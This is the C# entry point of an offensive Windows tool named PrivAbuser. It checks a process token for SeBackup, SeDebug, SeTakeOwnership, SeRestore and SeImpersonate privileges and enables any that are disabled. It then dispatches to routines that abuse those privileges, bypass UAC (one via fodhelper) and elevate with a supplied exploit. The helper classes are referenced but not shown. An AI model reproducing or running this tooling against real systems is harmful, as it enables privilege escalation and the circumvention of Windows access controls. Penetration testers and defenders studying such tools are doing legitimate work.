/**
 * - checks for privileges, which may be abused in order to bypass some security restrictions, or event to elevate own privileges;
 * - enables those privileges, if they are disabled
 * - tries to abose the given privileges
 **/

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PrivAbuser
{
    class Program
    {
        enum Privileges
        {
            SeTakeOwnershipPrivilege,
            SeBackuPrivilege,
            SeRestorePrivilege,
            SeDebugPrivilege,
            SeImpersonatePrivilege
        }

        static List<string> targetPrivs = new List<string>( new string[] { 
                                                                    "SeTakeOwnershipPrivilege", 
                                                                    "SeBackupPrivilege",
                                                                    "SeRestorePrivilege",
                                                                    "SeDebugPrivilege",
                                                                    "SeImpersonatePrivilege"} );
        static void helper()
        {
            Console.WriteLine("Usage: <exe> /checkPrivs /pid=");
            Environment.Exit(0);
        }
        static void Main(string[] args)
        {
            Dictionary<string, string> ar = Helper.ArgParser.parse(args);

            if (ar.ContainsKey("/abuseBackupPrivilege"))
            {
                if (ar.ContainsKey("/outPath"))
                {
                    string path = ar["/outPath"];
                    Abuser.SeBackupPrivilege.abuse(path);
                }
                else
                {
                    Abuser.SeBackupPrivilege.helper();
                    Environment.Exit(0);
                }
            }

            else if (ar.ContainsKey("/elevate"))
            {
                if (ar.ContainsKey("/exploit"))
                {
                    Abuser.UAC.elevate(ar["/exploit"]);
                }
                else
                {
                    Abuser.UAC.helper("elevate");
                }
            }

            else if (ar.ContainsKey("/bypassUAC"))
            {
                if (ar["/bypassUAC"].Equals("fodhelper"))
                {
                    try
                    {
                        Abuser.UAC.fodhelper(ar["/exploit"]);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.ToString());
                        Abuser.UAC.helper("bypassUAC");
                        Environment.Exit(0);
                    }
                }
                else
                {
                    if (ar.ContainsKey("/exploit"))
                    {
                        Abuser.UAC.bypass(ar["/exploit"]);
                    }
                    else
                    {
                        Abuser.UAC.helper("bypassUAC");
                    }
                }
            }
            
            else if (ar.ContainsKey("/abuseDebugPrivilege"))
            {
                if (ar.ContainsKey("/process") && ar.ContainsKey("/exploit"))
                { 
                    Abuser.SeDebugPrivilege.abuse(ar["/process"], ar["/exploit"]);
                }
                else
                {
                    Abuser.SeDebugPrivilege.helper();
                    Environment.Exit(0);
                }
            }

            else if (ar.ContainsKey("/abuseTakeOwnershipPrivilege"))
            {
                if (ar.ContainsKey("/path"))
                {
                    Abuser.SeTakeOwnershipPrivilige.abuse(ar["/path"]);
                }
                else
                {
                    Abuser.SeTakeOwnershipPrivilige.helper();
                    Environment.Exit(0);
                }
            }

            else if (ar.ContainsKey("/checkPrivs"))
            {
                if (ar.ContainsKey("/pid"))
                {
                    bool isInAdministrators = Abuser.UAC.isInGroupAdministrators();
                    bool isAdministrator = Abuser.UAC.isAdministrator();
                    bool isUACEnabled = Abuser.UAC.isUACEnabled();

                    if (isInAdministrators)
                    {
                        Console.WriteLine("[!] Current user is in administrators group");
                        if (isAdministrator)
                        {
                            Console.WriteLine("[!] ... and is already an administrator.");
                        }
                        else if (isUACEnabled)
                        {
                            Console.WriteLine("[-] UAC is enabled. Try to bypass as follows:");
                            Abuser.UAC.helper("bypassUAC");
                        }
                        else
                        {
                            Console.WriteLine("[!} UAC is not enabled. Elevate as follows:");
                            Abuser.UAC.helper("elevate");
                        }
                    }

                    int pid = int.Parse(ar["/pid"]);
                    IntPtr hToken = PrivUtils.Tool.getProcessToken(pid);
                    Dictionary<string, bool> privs = PrivUtils.Tool.getAllUserPrivs(hToken);
                    bool res;
                    foreach (KeyValuePair<string, bool> entry in privs)
                    {
                        if (targetPrivs.Contains(entry.Key))
                        {
                            Console.WriteLine(String.Format("[!] Found interesting privilege: {0}", entry.Key));
                            if (!entry.Value)
                            {
                                Console.WriteLine("[-] Privilege is disabled. Trying to enable it...");
                                res = PrivUtils.Tool.enablePriv(pid, entry.Key.ToString());
                                Console.WriteLine("[!] " + res);
                                res = true;
                            }
                            else
                            {
                                res = true;
                            }

                            if (res && entry.Key.Equals("SeBackupPrivilege"))
                            {
                                Console.WriteLine("[!] Abusing SeBackupPrivilege may be possible");
                                Abuser.SeBackupPrivilege.helper();
                            }
                            if (res && entry.Key.Equals("SeDebugPrivilege"))
                            {
                                Console.WriteLine("[!] Abusing SeDebugPrivilege may be possible");
                                Abuser.SeDebugPrivilege.helper();
                            }
                            if (res && entry.Key.Equals("SeTakeOwnershipPrivilege"))
                            {
                                Console.WriteLine("[!] Abusing SeTakeOwnershipPrivilege may be possible");
                                Abuser.SeTakeOwnershipPrivilige.helper();
                            }
                        }
                    }
                }
                else
                {
                    helper();
                }
            }

            else
            {
                helper();
            }
        }
    }
}
